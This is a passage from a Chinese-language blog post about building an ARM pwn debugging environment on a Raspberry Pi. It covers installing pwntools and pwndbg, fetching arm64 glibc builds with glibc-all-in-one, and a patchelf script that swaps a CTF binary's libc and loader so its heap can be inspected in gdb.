alt="检查pip版本"></p><p>说明pip安装完成</p><p>接下来安装pwntools</p><p>安装pwntools之前还需要一些准备工作,</p><p>安装gcc</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install gcc</span><br></pre></td></tr></table></figure><p>安装capstone</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install make </span><br><span class="line">git <span class="built_in">clone</span> https://github.com/aquynh/capstone</span><br><span class="line"><span class="built_in">cd</span> capstone</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>安装pwntools</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-dev</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Gallopsled/pwntools</span><br><span class="line"><span class="built_in">cd</span> pwntools</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>验证一下pwntools可用</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717113956081.png" alt="验证pwntools"></p><p>如果不出意外，这里pwntools就安装好了，<strong>不要尝试</strong>用pip安装，基本不可能安装成功的，如果有其他情况就多搜索吧，或者评论区问我，如果我知道怎么回事，会给你回复的。这里pwntools算是安装完成了如果有问题我还是推荐装python3的pwntools吧,可能哪一天python2就不能用了,不是吗,我在装32位arm的ubuntu环境的时候发现无论如何都搞不定,我已经绝望了,还是适应python3吧.</p><p>python3安装pwntools的话就简单多了</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential -y</span><br><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">pip3 install --upgrade pwntools</span><br></pre></td></tr></table></figure><h2 id="pwndbg安装"><a href="#pwndbg安装" class="headerlink" title="pwndbg安装"></a>pwndbg安装</h2><p>使用下面命令来安装pwntools</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">sudo ./setup.sh</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717121038336.png" alt="验证pwndbg安装"></p><p>这样就是安装成功啦</p><h2 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h2><p>patchelf是我们用来改写文件ld和libc的这里推荐<em>patchelf_0.12</em></p><p><a href="https://github.com/NixOS/patchelf">https://github.com/NixOS/patchelf</a></p><p>github地址在这里里面有详细的教学，这里就不赘述啦</p><p>按照官方教程来就好了</p><h2 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc all in one"></a>glibc all in one</h2><p>这里还需要glibc all in one，虽然glibc all in one的下的库是x86下的，但是这个可以帮助我们很好的管理gliibc</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one</span><br></pre></td></tr></table></figure><p>使用上面语句进行下载</p><p>然后随便下载一个libc，形成文件夹</p><p>下载好后需要安装一个库,并形成文件夹</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">chmod 777 -R glibc-all-in-one/</span><br><span class="line"><span class="built_in">cd</span> glibc-all-in-one/</span><br><span class="line">sudo pip install requests </span><br><span class="line">./update_list</span><br><span class="line">./download 2.23-0ubuntu11.3_amd64</span><br></pre></td></tr></table></figure><p>这样基本就完成了</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717131220453.png" alt="完成后的效果"></p><p>类似上图，然后删除debs和libc里的文件，这些都是x86下的，用不到的.</p><h1 id="如何更改libc并完成调试"><a href="#如何更改libc并完成调试" class="headerlink" title="如何更改libc并完成调试"></a>如何更改libc并完成调试</h1><h2 id="下载libc"><a href="#下载libc" class="headerlink" title="下载libc"></a>下载libc</h2><p>当什么的工作都完成了我们就可以开始调试啦，我们以一道题目为例</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717130021816.png" alt="例子"></p><p>一般附件会给我们四个文件，这里我们需要的只要libc-2.31.so和题目文件</p><p>先将libc放入我们的树莓派系统中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x libc-2.31.so</span><br><span class="line">./libc-2.31.so</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717132511485.png" alt="查看libc版本"></p><p>这样我们就能找到对应的libc版本</p><p>在这个网站中我们可以找到不同架构的不同版本libc，只要<strong>更改最后的路径</strong>即可,需要什么版本搜索什么</p><p><a href="https://launchpad.net/ubuntu/+source/glibc/2.31-0ubuntu9.2">https://launchpad.net/ubuntu/+source/glibc/2.31-0ubuntu9.2</a></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717132941579.png" alt="寻找libc"></p><p>点击上图的arm64</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717133112289.png" alt="需要下载的包">下载如图所示的文件(其他版本也是这样格式)到这里*/home/<strong>yourneme</strong>/glibc-all-in-one/debs<em>，注意<strong>yourname</strong>是你主机的名字，可以直接<strong>拖动</strong>到Finallshell显示的该文件夹下，或者*<em>复制</em></em></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717133330375.png" alt="下载路径"></p><p>路径如图</p><p>在glibc目录下运行下面命令（<strong>注意更改路径，将ubuntu换成你的名字</strong>）</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./extract /home/ubuntu/glibc-all-in-one/debs/libc6_2.31-0ubuntu9.2_arm64.deb /home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.2_arm64</span><br><span class="line">./extract /home/ubuntu/glibc-all-in-one/debs/libc6-dbg_2.31-0ubuntu9.2_arm64.deb /home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.2_arm64/.debug</span><br></pre></td></tr></table></figure><p>这样libc就部署好了。</p><h2 id="使用patchelf改变ld和libc"><a href="#使用patchelf改变ld和libc" class="headerlink" title="使用patchelf改变ld和libc"></a>使用patchelf改变ld和libc</h2><p>这里提供一个脚本来帮助师傅们更改libc，脚本来源：<em><a href="https://bbs.pediy.com/thread-254868.htm">https://bbs.pediy.com/thread-254868.htm</a></em></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> -x</span><br><span class="line">libc_path=<span class="variable">$1</span></span><br><span class="line">elf_path=<span class="variable">$2</span></span><br><span class="line">patchelf_bin_path=<span class="string">&quot;/home/ubuntu/patchelf/src/patchelf&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$&#123;libc_path&#125;</span>/ld-[2].[0-9][0-9].so ]; <span class="keyword">then</span></span><br><span class="line">    <span class="variable">$patchelf_bin_path</span> --set-interpreter <span class="variable">$libc_path</span>/ld-[2].[0-9][0-9].so <span class="variable">$elf_path</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$libc_path</span>/libc-[2].[0-9][0-9].so ]; <span class="keyword">then</span></span><br><span class="line">    <span class="variable">$patchelf_bin_path</span> --replace-needed libc.so.6 <span class="variable">$libc_path</span>/libc-[2].[0-9][0-9].so <span class="variable">$elf_path</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">set</span> +x</span><br></pre></td></tr></table></figure><p>这里的*patchelf_bin_path=”/home/ubuntu/patchelf/src/patchelf”*路径需要师傅们自行更改为自己patchelf的路径，<strong>注意不是文件夹是文件夹里的文件</strong>。</p><p>将该脚本命名为chlibc.sh</p><p>添加可执行权限</p><p>使用该脚本</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./chlibc.sh /home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.2_arm64 channel </span><br></pre></td></tr></table></figure><p>第二个路径是你<strong>libc文件夹</strong>的位置，最后是你文件的位置，这样就实现了对文件的patch，改变了文件的ld和libc</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717134856774.png" alt="patch"></p><p>使用ldd验证一下</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717134809674.png" alt="验证"></p><p>可以发现没有任何问题</p><h2 id="调试验证"><a href="#调试验证" class="headerlink" title="调试验证"></a>调试验证</h2><p>我们用gdb调试一下看看</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717134953976.png" alt="heap可行"></p><p>这样完成调试，显示heap</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717135015786.png" alt="bins可行"></p><p>也可以正常显示bins，这样就完成了我们的环境搭建了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这是我的第一篇博客啦，有写的有问题的地方还望各位师傅斧正。上面的操作基本可以实现在arm架构下的脚本写exp并调试，如果觉得自带的vim不够方便的话还可以使用远程编辑exp，这个会在日后更新的。这里是本人的一点拙见，希望我写的东西能对你有一丝丝的帮助，感谢每个观看该文章的师傅。</p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Armpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Arm </tag>
            
            <tag> Iot </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
